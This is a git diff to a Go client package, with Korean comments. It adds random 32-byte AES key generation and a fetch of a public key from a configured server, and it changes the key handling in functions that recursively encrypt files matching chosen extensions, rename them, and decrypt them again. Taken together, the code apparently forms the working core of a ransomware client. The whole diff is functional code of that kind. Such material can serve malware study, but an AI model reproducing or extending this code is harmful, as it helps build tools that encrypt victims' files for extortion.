@@ -1,6 +1,8 @@
 package client
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -13,8 +15,20 @@ import (
 	"strings"
 )
 
-// GetKey 는 서버로부터 키를 가져온다.
-func (c *Client) GetKey() (*string, error) {
+// CreateRandomKey 는 32바이트 난수 키를 생성합니다.
+func (c *Client) CreateRandomKey() []byte {
+	key := make([]byte, 32)
+	_, err := rand.Read(key)
+	if err != nil {
+		panic(err)
+	}
+	c.Key = fmt.Sprintf("%x", key)
+
+	return key
+}
+
+// GetPublicKey 는 서버로부터 공개키를 가져온다.
+func (c *Client) GetPublicKey() (*string, error) {
 	res, err := http.Get(c.config.Network.Uri)
 	if err != nil {
 		log.Println(err)
@@ -43,7 +57,7 @@ func (c *Client) GetKey() (*string, error) {
 		return nil, err
 	}
 
-	return &c.Key, nil
+	return &c.PublicKey, nil
 }
 
 // AESEncryptDirectory 는 전달한 root 경로부터 하위 폴더까지 탐색하면서 파일을 암호화 합니다.
@@ -61,7 +75,8 @@ func (c *Client) AESEncryptDirectory(rootPath string) error {
 				if strings.HasSuffix(info.Name(), extension) {
 					//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())
 					// 파일을 암호화
-					if err = encrypt.EncryptFile(path, []byte(c.Key)); err != nil {
+					keyToByte, _ := hex.DecodeString(c.Key)
+					if err = encrypt.EncryptFile(path, keyToByte); err != nil {
 						log.Printf("error encrypting %s: %v\n", path, err)
 						return err
 					} else { // 암호화 성공시 확장자 변경
@@ -106,7 +121,8 @@ func (c *Client) AESDecryptDirectory(rootPath string) error {
 					return err
 				} else {
 					//파일내용을 복호화
-					if err = decrypt.DecryptFile(*newPath, []byte(c.Key)); err != nil {
+					keyToByte, _ := hex.DecodeString(c.Key)
+					if err = decrypt.DecryptFile(*newPath, keyToByte); err != nil {
 						log.Printf("error decrypting %s: %v\n", path, err)
 						return err
 					}
